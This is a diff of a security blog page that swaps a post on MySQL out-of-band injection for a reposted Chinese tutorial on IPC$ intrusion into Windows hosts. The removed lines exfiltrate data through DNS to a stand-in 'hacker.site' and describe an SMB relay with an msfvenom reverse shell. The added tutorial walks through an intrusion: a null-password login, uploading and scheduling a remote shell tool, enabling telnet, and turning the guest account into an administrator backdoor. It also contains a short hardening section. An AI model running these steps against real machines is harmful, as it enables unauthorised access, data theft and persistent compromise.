@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          Out of band injection - Rootclay
+          一份详尽的IPC$入侵资料 - Rootclay
         
     </title>
 
-    <link rel="canonical" href="http://rootclay.github.io/2017/04/09/Mysql_oob/">
+    <link rel="canonical" href="http://rootclay.github.io/2017/07/25/IPC/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -88,14 +88,12 @@
                             
                               <a class="tag" href="/tags/#Web" title="Web">Web</a>
                             
-                              <a class="tag" href="/tags/#SQL" title="SQL">SQL</a>
-                            
                         </div>
-                        <h1>Out of band injection</h1>
-                        <h2 class="subheading">Mysql中的带外注入.</h2>
+                        <h1>一份详尽的IPC$入侵资料</h1>
+                        <h2 class="subheading">一份详尽的IPC$入侵资料.</h2>
                         <span class="meta">
                             Posted by Rootclay on
-                            2017-04-09
+                            2017-07-25
                         </span>
                     </div>
                 
@@ -213,59 +211,180 @@
                 post-container">
 
                 <blockquote>
-<p>这篇文章主要讲关于mysql的带外注入,主要利用的函数为load_file()和select … into outfile/dumpfile还有SMB服务之类的注入</p>
+<p>转自<a href="http://www.xfocus.net/articles/200303/493.html" target="_blank" rel="external">http://www.xfocus.net/articles/200303/493.html</a></p>
 </blockquote>
-<h2 id="那什么是带外通道注入呢">那什么是带外通道注入呢?</h2>
-<p>带外通道攻击主要是利用其他协议或者渠道从服务器提取数据. 它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等.</p>
-<h2 id="限制">限制</h2>
-<p>在MySQL中，存在一个称为<code>secure_file_priv</code>的全局系统变量。 该变量用于限制数据的导入和导出操作</p>
-<p>例如SELECT … INTO OUTFILE语句和LOAD_FILE（）</p>
+<h2 id="一-唠叨一下">一 唠叨一下：</h2>
+<p>网上关于ipc$入侵的文章可谓多如牛毛,而且也不乏优秀之作,攻击步骤甚至可以说已经成为经典的模式,因此也没人愿意再把这已经成为定式的东西拿出来摆弄.</p>
+<p>不过话虽这样说,但我个人认为这些文章讲解的并不详细,对于第一次接触ipc$的菜鸟来说,简单的罗列步骤并不能解答他们的许多迷惑(你随便找一个hack论坛搜一下ipc,看存在的疑惑有多少).</p>
+<p>因此我写了这篇相当于解惑的教程.想把一些容易混淆,容易迷惑人的问题说清楚,让大家不要总徘徊在原地!如果你看完这篇帖子仍有疑问,请马上回复!</p>
+<h2 id="二-什么是ipc">二 什么是ipc$</h2>
+<p>IPC$(Internet Process Connection)是共享&quot;命名管道&quot;的资源(大家都是这么说的)，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。</p>
+<p>利用IPC$,连接者甚至可以与目标主机建立一个空的连接而无需用户名与密码(当然,对方机器必须开了ipc$共享,否则你是连接不上的)，而利用这个空的连接，连接者还可以得到目标主机上的用户列表(不过负责的管理员会禁止导出用户列表的)。</p>
+<p>我们总在说ipc$漏洞ipc$漏洞,其实,ipc$并不是真正意义上的漏洞,它是为了方便管理员的远程管理而开放的远程网络登陆功能,而且还打开了默认共享,即所有的逻辑盘(c$,d$,e$……)和系统目录winnt或windows(admin$)。</p>
+<p>所有的这些,初衷都是为了方便管理员的管理,但好的初衷并不一定有好的收效,一些别有用心者(到底是什么用心?我也不知道,代词一个)会利用IPC$，访问共享资源,导出用户列表,并使用一些字典工具，进行密码探测,寄希望于获得更高的权限,从而达到不可告人的目的.</p>
+<p>解惑:</p>
 <ol>
-<li>首先不用多说,这些函数是需要绝对路径的</li>
-<li>如果<code>secure_file_priv</code>变量为空那么直接可以使用函数,如果为null是不能使用</li>
-<li>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</li>
+<li>IPC连接是Windows NT及以上系统中特有的远程网络登陆功能，其功能相当于Unix中的Telnet,由于IPC$功能需要用到Windows NT中的很多DLL函数，所以不能在Windows 9.x中运行。<br>
+也就是说只有nt/2000/xp才可以建立ipc$连接,98/me是不能建立ipc$连接的(但有些朋友说在98下能建立空的连接,不知道是真是假,不过现在都2003年了,建议98的同志换一下系统吧,98不爽的)</li>
+<li>即使是空连接也不是100%都能建立成功,如果对方关闭了ipc$共享,你仍然无法建立连接</li>
+<li>并不是说建立了ipc$连接就可以查看对方的用户列表,因为管理员可以禁止导出用户列表</li>
 </ol>
-<p><img src="./img/out_of_band/1.PNG" alt=""></p>
-<h2 id="dns注入">DNS注入</h2>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,<span class="keyword">version</span>(),<span class="string">'.hacker.site\\a.txt'</span>));</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="number">0x5c5c5c5c</span>,<span class="keyword">version</span>(),<span class="number">0x2e6861636b65722e736974655c5c612e747874</span>));</div></pre></td></tr></table></figure>
-<p><img src="./img/out_of_band/2.PNG" alt=""></p>
-<p>DNS解析站点:<a href="http://ceye.io/record/index" target="_blank" rel="external">CEYE</a></p>
-<h2 id="smb-relay-注入攻击">SMB Relay 注入攻击</h2>
-<h3 id="what-is-smb-relay">What is SMB relay</h3>
-<p>在谈SMBRELAY之前我们先看看下面的一段文档<br>
-Dominique Brezinski <a href="mailto:dominique.brezinski@CyberSafe.COM" target="_blank" rel="external">dominique.brezinski@CyberSafe.COM</a>对外<br>
-发布了一份关于Windows NT身份验证机制脆弱性的文档<br>
-假设有主机B与A<br>
-(1) A向B发起连接请求<br>
-(2) B向A发送挑战(一组随机数据，8字节)<br>
-(3) A用源自明文口令的DESKEY对挑战进行标准DES加密得到响应，并发往B<br>
-(4) B从SAM中获取A的LM Hash、NTLM Hash，计算出DESKEY，并对前面发往A的挑战进<br>
-行标准DES加密<br>
-(5) 如果(4)中计算结果与A送过来的响应匹配，A被允许访问B<br>
-现在假设一个攻击者C卷入其中<br>
-(1) C向B发起连接请求<br>
-(2) B向C发送挑战D(一组随机数据)<br>
-(3) C等待A向B发起连接请求<br>
-(4) 当A向B发起连接请求时，C伪造成B向A发送挑战D<br>
-(5) A用源自明文口令的DESKEY对挑战D进行标准DES加密得到响应E，并发往B<br>
-(6) C截获到响应E，将它做为针对(2)中挑战D的响应发往B，并声称自己是A<br>
-(7) B从SAM中获取A的LM Hash、NTLM Hash，计算出DESKEY，并对挑战D进行标准DES<br>
-加密<br>
-(8) 如果(7)中计算结果与C送过来的响应匹配，C被允许以A的身份访问B。</p>
-<p>###攻击流程</p>
-<p><img src="./img/out_of_band/3.PNG" alt=""></p>
-<p>关于SMB relay攻击窃取NTML与shell请看这篇文章<a href="http://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python" target="_blank" rel="external">SMB Relay Demystified and NTLMv2 Pwnage with Python</a><br>
-步骤:</p>
+<h2 id="三-建立ipc连接在hack攻击中的作用">三 建立ipc$连接在hack攻击中的作用</h2>
+<p>就像上面所说的,即使你建立了一个空的连接,你也可以获得不少的信息(而这些信息往往是入侵中必不可少的),访问部分共享,如果你能够以某一个具有一定权限的用户身份登陆的话,那么你就会得到相应的权限,显然,如果你以管理员身份登陆,嘿嘿,就不用我在多说了吧,what u want,u can do!!</p>
+<p>(基本上可以总结为获取目标信息、管理目标进程和服务,上传木马并运行,如果是2000server，还可以考虑开启终端服务方便控制.怎么样?够厉害吧!)<br>
+不过你也不要高兴的太早,因为管理员的密码不是那么好搞到的,虽然会有一些傻傻的管理员用空口令或者弱智密码,但这毕竟是少数,而且现在不比从前了,随着人们安全意识的提高,管理员们也愈加小心了,得到管理员密码会越来越难的:(</p>
+<p>因此今后你最大的可能就是以极小的权限甚至是没有权限进行连接,你会慢慢的发现ipc$连接并不是万能的,甚至在主机不开启ipc$共享时,你根本就无法连接.<br>
+所以我认为,你不要把ipc$入侵当作终极武器,不要认为它战无不胜,它就像是足球场上射门前的传球,很少会有致命一击的效果,但却是不可缺少的,我觉得这才是ipc$连接在hack入侵中的意义所在.</p>
+<h2 id="四-ipc与空连接139445端口默认共享的关系">四 ipc$与空连接,139,445端口,默认共享的关系</h2>
+<p>以上四者的关系可能是菜鸟很困惑的一个问题,不过大部分文章都没有进行特别的说明,其实我理解的也不是很透彻,都是在与大家交流中总结出来的.(一个有良好讨论氛围的BBS可以说是菜鸟的天堂)</p>
 <ol>
-<li>首先生成一个反向shell:<br>
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=攻击机监听端口  -f exe &gt; reverse_shell.exe</li>
-<li>运行smbrelayx，指定被攻击者和生成的反向shell，等待连接。<br>
-<a href="http://smbrelayx.py" target="_blank" rel="external">smbrelayx.py</a> -h 被攻击者ip -e 反向shell文件位置</li>
-<li>使用模块multi/handler。侦听攻击机ip,攻击机监听端口</li>
-<li>在MySQL Server上运行如下的代码，则会产生shell。相当于访问攻击机的smb服务,但实际上是窃取了mysql_server的身份<br>
-select load_file(’\\攻击机ip\aa’);</li>
+<li>
+<p>ipc$与空连接:<br>
+不需要用户名与密码的ipc$连接即为空连接,一旦你以某个用户或管理员的身份登陆(即以特定的用户名和密码进行ipc$连接),自然就不能叫做空连接了.<br>
+许多人可能要问了,既然可以空连接,那我以后就空连接好了,为什么还要费九牛二虎之力去扫描弱口令,呵呵,原因前面提到过,当你以空连接登陆时,你没有任何权限(很郁闷吧),而你以用户或管理员的身份登陆时,你就会有相应的权限(有权限谁不想呀,所以还是老老实实扫吧,不要偷懒哟).</p>
+</li>
+<li>
+<p>ipc$与139,445端口:<br>
+ipc$连接可以实现远程登陆及对默认共享的访问;而139端口的开启表示netbios协议的应用,我们可以通过139,445(win2000)端口实现对共享文件/打印机的访问,因此一般来讲,ipc$连接是需要139或445端口来支持的.</p>
+</li>
+<li>
+<p>ipc$与默认共享<br>
+默认共享是为了方便管理员远程管理而默认开启的共享(你当然可以关闭它),即所有的逻辑盘(c$,d$,e$……)和系统目录winnt或windows(admin$),我们通过ipc$连接可以实现对这些默认共享的访问(前提是对方没有关闭这些默认共享)</p>
+</li>
 </ol>
-<p><a href="https://www.exploit-db.com/docs/41273.pdf" target="_blank" rel="external">source</a></p>
+<h2 id="五-ipc连接失败的原因">五 ipc$连接失败的原因</h2>
+<p>以下5个原因是比较常见的:</p>
+<ol>
+<li>你的系统不是NT或以上操作系统;</li>
+<li>对方没有打开ipc$默认共享</li>
+<li>对方未开启139或445端口(惑被防火墙屏蔽)</li>
+<li>你的命令输入有误(比如缺少了空格等)</li>
+<li>用户名或密码错误(空连接当然无所谓了)<br>
+另外,你也可以根据返回的错误号分析原因：<br>
+错误号5，拒绝访问 ： 很可能你使用的用户不是管理员权限的，先提升权限； <br><br>
+错误号51，Windows 无法找到网络路径 : 网络有问题； <br><br>
+错误号53，找不到网络路径 ： ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）； <br><br>
+错误号67，找不到网络名 ： 你的lanmanworkstation服务未启动；目标删除了ipc$； <br><br>
+错误号1219，提供的凭据与已存在的凭据集冲突 ： 你已经和对方建立了一个ipc$，请删除再连。 <br><br>
+错误号1326，未知的用户名或错误密码 ： 原因很明显了； <br><br>
+错误号1792，试图登录，但是网络登录服务没有启动 ： 目标NetLogon服务未启动。（连接域控会出现此情况） <br><br>
+错误号2242，此用户的密码已经过期 ： 目标有帐号策略，强制定期要求更改密码。 <br><br>
+关于ipc$连不上的问题比较复杂，除了以上的原因,还会有其他一些不确定因素,在此本人无法详细而确定的说明,就靠大家自己体会和试验了.<br></li>
+</ol>
+<h2 id="六-如何打开目标的ipc此段引自相关文章">六  如何打开目标的IPC$(此段引自相关文章)</h2>
+<p>首先你需要获得一个不依赖于ipc$的shell，比如sql的cmd扩展、telnet、木马,当然，这shell必须是admin权限的,然后你可以使用shell执行命令 net share ipc$ 来开放目标的ipc$。从上面可以知道，ipc$能否使用还有很多条件。请确认相关服务都已运行，没有就启动它（不知道怎么做的请看net命令的用法）,还是不行的话（比如有防火墙，杀不了）建议放弃。</p>
+<h2 id="七-如何防范ipc入侵">七  如何防范ipc$入侵</h2>
+<ol>
+<li>
+<p>禁止空连接进行枚举(此操作并不能阻止空连接的建立,引自《解剖win2000下的空会话》)<br>
+首先运行regedit，找到如下组建[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA]把RestrictAnonymous = DWORD的键值改为：00000001(如果设置为2的话,有一些问题会发生,比如一些WIN的服务出现问题等等)</p>
+</li>
+<li>
+<p>禁止默认共享<br><br>
+1）察看本地共享资源<br><br>
+运行-cmd-输入net share<br><br>
+2）删除共享(每次输入一个）<br><br>
+net share ipc$ /delete<br><br>
+net share admin$ /delete<br><br>
+net share c$ /delete<br><br>
+net share d$ /delete（如果有e,f,……可以继续删除）<br><br>
+3）停止server服务<br><br>
+net stop server /y （重新启动后server服务会重新开启）<br><br>
+4）修改注册表<br><br>
+运行-regedit<br><br>
+server版:找到如下主键[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]把AutoShareServer（DWORD）的键值改为:00000000。 <br><br>
+pro版:找到如下主键[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]把AutoShareWks（DWORD）的键值改为:00000000。 <br><br>
+如果上面所说的主键不存在，就新建(右击-新建-双字节值）一个主健再改键值。 <br></p>
+</li>
+<li>
+<p>永久关闭ipc$和默认共享依赖的服务:lanmanserver即server服务<br>
+控制面板-管理工具-服务-找到server服务（右击）-属性-常规-启动类型-已禁用</p>
+</li>
+<li>
+<p>安装防火墙(选中相关设置)，或者端口过滤(滤掉139,445等),或者用新版本的优化大师</p>
+</li>
+<li>
+<p>设置复杂密码，防止通过ipc$穷举密码</p>
+</li>
+</ol>
+<p>（本教程不定期更新，欲获得最新版本，请登陆官方网站：菜菜鸟社区原创http://ccbirds.yeah.net）</p>
+<h2 id="八-相关命令">八 相关命令</h2>
+<ol>
+<li>
+<p>建立空连接:<br><br>
+net use \IP\ipc$ “” /user:&quot;&quot;        (一定要注意:这一行命令中包含了3个空格)</p>
+</li>
+<li>
+<p>建立非空连接:<br><br>
+net use \IP\ipc$ “用户名” /user:“密码”     (同样有3个空格)</p>
+</li>
+<li>
+<p>映射默认共享:<br><br>
+net use z: \IP\c$ “密码” /user:“用户名”       (即可将对方的c盘映射为自己的z盘，其他盘类推)<br><br>
+如果已经和目标建立了ipc$，则可以直接用IP+盘符+$访问,具体命令 net use z: \IP\c$</p>
+</li>
+<li>
+<p>删除一个ipc$连接<br><br>
+net use \IP\ipc$ /del</p>
+</li>
+<li>
+<p>删除共享映射<br><br>
+net use c: /del 删除映射的c盘，其他盘类推<br><br>
+net use * /del 删除全部,会有提示要求按y确认</p>
+</li>
+</ol>
+<h2 id="九-经典入侵模式">九 经典入侵模式</h2>
+<p>这个入侵模式太经典了,大部分ipc教程都有介绍,我也就拿过来引用了,在此感谢原创作者!(不知道是哪位前辈)</p>
+<ol>
+<li>
+<p>C:&gt;net use \127.0.0.1\IPC$ “” /user:“admintitrators&quot;<br>
+这是用《流光》扫到的用户名是administrators，密码为&quot;空&quot;的IP地址(空口令?哇,运气好到家了)，如果是打算攻击的话，就可以用这样的命令来与127.0.0.1建立一个连接，因为密码为&quot;空”，所以第一个引号处就不用输入，后面一个双引号里的是用户名，输入administrators，命令即可成功完成。</p>
+</li>
+<li>
+<p>C:&gt;copy srv.exe \127.0.0.1\admin$<br>
+先复制srv.exe上去，在流光的Tools目录下就有（这里的$是指admin用户的c:\winnt\system32\，大家还可以使用c$、d$，意思是C盘与D盘，这看你要复制到什么地方去了）。</p>
+</li>
+<li>
+<p>C:&gt;net time \127.0.0.1<br>
+查查时间，发现127.0.0.1 的当前时间是 2002/3/19 上午 11:00，命令成功完成。</p>
+</li>
+<li>
+<p>C:&gt;at \127.0.0.1 11:05 srv.exe<br>
+用at命令启动srv.exe吧（这里设置的时间要比主机时间快，不然你怎么启动啊，呵呵！）</p>
+</li>
+<li>
+<p>C:&gt;net time \127.0.0.1<br>
+再查查到时间没有？如果127.0.0.1 的当前时间是 2002/3/19 上午 11:05，那就准备开始下面的命令。</p>
+</li>
+<li>
+<p>C:&gt;telnet 127.0.0.1 99<br>
+这里会用到Telnet命令吧，注意端口是99。Telnet默认的是23端口，但是我们使用的是SRV在对方计算机中为我们建立一个99端口的Shell。<br>
+虽然我们可以Telnet上去了，但是SRV是一次性的，下次登录还要再激活！所以我们打算建立一个Telnet服务！这就要用到ntlm了<br>
+　　<br>
+7.C:&gt;copy ntlm.exe \127.0.0.1\admin$<br>
+用Copy命令把ntlm.exe上传到主机上（ntlm.exe也是在《流光》的Tools目录中）。</p>
+</li>
+<li>
+<p>C:\WINNT\system32&gt;ntlm<br>
+输入ntlm启动（这里的C:\WINNT\system32&gt;指的是对方计算机，运行ntlm其实是让这个程序在对方计算机上运行）。当出现&quot;DONE&quot;的时候，就说明已经启动正常。然后使用&quot;net start telnet&quot;来开启Telnet服务！</p>
+</li>
+<li>
+<p>Telnet 127.0.0.1，接着输入用户名与密码就进入对方了，操作就像在DOS上操作一样简单！(然后你想做什么?想做什么就做什么吧,哈哈)<br>
+为了以防万一,我们再把guest激活加到管理组</p>
+</li>
+<li>
+<p>C:&gt;net user guest /active:yes<br>
+将对方的Guest用户激活</p>
+</li>
+<li>
+<p>C:&gt;net user guest 1234<br>
+将Guest的密码改为1234,或者你要设定的密码</p>
+</li>
+<li>
+<p>C:&gt;net localgroup administrators guest /add<br>
+将Guest变为Administrator^_^(如果管理员密码更改，guest帐号没改变的话，下次我们可以用guest再次访问这台计算机)</p>
+</li>
+</ol>
 
                 
 
@@ -274,12 +393,12 @@ select load_file(’\\攻击机ip\aa’);</li>
                 <ul class="pager">
                     
                         <li class="previous">
-                            <a href="/2017/04/21/MySQL注入攻击与防御/" data-toggle="tooltip" data-placement="top" title="MySQL注入攻击与防御">&larr; Previous Post</a>
+                            <a href="/2017/08/01/SSH如何稳定方向代理/" data-toggle="tooltip" data-placement="top" title="SSH如何反向代理稳定穿透内网">&larr; Previous Post</a>
                         </li>
                     
                     
                         <li class="next">
-                            <a href="/2017/03/23/mysql日志包含拿shell/" data-toggle="tooltip" data-placement="top" title="SQL语句利用日志写shell">Next Post &rarr;</a>
+                            <a href="/2017/07/25/Innet_proxy/" data-toggle="tooltip" data-placement="top" title="内网代理">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -327,7 +446,7 @@ select load_file(’\\攻击机ip\aa’);</li>
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#那什么是带外通道注入呢"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">那什么是带外通道注入呢?</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#限制"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">限制</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#dns注入"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">DNS注入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#smb-relay-注入攻击"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">SMB Relay 注入攻击</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#what-is-smb-relay"><span class="toc-nav-number">4.1.</span> <span class="toc-nav-text">What is SMB relay</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#一-唠叨一下"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">一 唠叨一下：</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#二-什么是ipc"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">二 什么是ipc$</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#三-建立ipc连接在hack攻击中的作用"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">三 建立ipc$连接在hack攻击中的作用</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#四-ipc与空连接139445端口默认共享的关系"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">四 ipc$与空连接,139,445端口,默认共享的关系</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#五-ipc连接失败的原因"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">五 ipc$连接失败的原因</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#六-如何打开目标的ipc此段引自相关文章"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">六  如何打开目标的IPC$(此段引自相关文章)</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#七-如何防范ipc入侵"><span class="toc-nav-number">7.</span> <span class="toc-nav-text">七  如何防范ipc$入侵</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#八-相关命令"><span class="toc-nav-number">8.</span> <span class="toc-nav-text">八 相关命令</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#九-经典入侵模式"><span class="toc-nav-number">9.</span> <span class="toc-nav-text">九 经典入侵模式</span></a></li></ol>
         
         </div>
       </aside>
@@ -348,8 +467,6 @@ select load_file(’\\攻击机ip\aa’);</li>
                     <div class="tags">
                        
                           <a class="tag" href="/tags/#Web" title="Web">Web</a>
-                        
-                          <a class="tag" href="/tags/#SQL" title="SQL">SQL</a>
                         
                     </div>
                 </section>
@@ -398,8 +515,8 @@ select load_file(’\\攻击机ip\aa’);</li>
 <script type="text/javascript">
     /* * * CONFIGURATION VARIABLES * * */
     var disqus_shortname = "rootclay";
-    var disqus_identifier = "http://rootclay.github.io/2017/04/09/Mysql_oob/";
-    var disqus_url = "http://rootclay.github.io/2017/04/09/Mysql_oob/";
+    var disqus_identifier = "http://rootclay.github.io/2017/07/25/IPC/";
+    var disqus_url = "http://rootclay.github.io/2017/07/25/IPC/";
 
     (function() {
         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
